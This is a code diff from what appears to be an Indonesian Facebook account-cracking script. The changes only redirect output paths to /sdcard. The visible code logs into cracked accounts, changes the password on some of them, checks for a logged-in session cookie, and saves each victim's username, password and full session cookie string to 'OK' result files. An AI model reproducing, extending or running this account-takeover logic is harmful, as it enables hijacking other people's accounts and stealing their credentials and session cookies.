@@ -2685,7 +2685,7 @@ pwBaru = []
 ubahP = []
 
 def file_cp():
-	dirs = os.listdir('CP')
+	dirs = os.listdir('/sdcard/CP')
 	print ("%s%s%s%s\033[0m\033[0mPilih Hasil Crack Yg Tersimpan Untuk Cek Opsi %s\n"%(P,til,P,P,P))
 	for file in dirs:
 		print("%s%s\033[0m%s"%(U,til,file));jeda(0.07)
@@ -2784,7 +2784,7 @@ def mengecek(user,pw):
 						an=session.post(url+link3.get("action"),data=dat2)
 						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 						print("\r%s%s\033[0mAkun One Tab, Sandi Berhasil Di Ubah \n [+] OK %s%s%s|%s|%s			"%(P,til,P,P,user,pwbaru[0],coki))
-						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (P,user,pwbaru[0],coki))
+						open('/sdcard/OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (P,user,pwbaru[0],coki))
 				else:
 					print("\r%s%s \033[0mAkun One Tab, Silahkan Anda Login		"%(P,til))
 					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (P,user,pw,coki))
@@ -2795,7 +2795,7 @@ def mengecek(user,pw):
 		else:
 			if "c_user" in session.cookies.get_dict():
 				print("\r%s%s Akun Tidak Checkpoint, Silahkan Anda Login "%(P))
-				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (P,user,pw))
+				open('/sdcard/OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (P,user,pw))
 		for opsi in range(len(cek)):
 			number +=1
 			jalan ("  %s%s. %s%s"%(P,str(number),P,cek[opsi]))
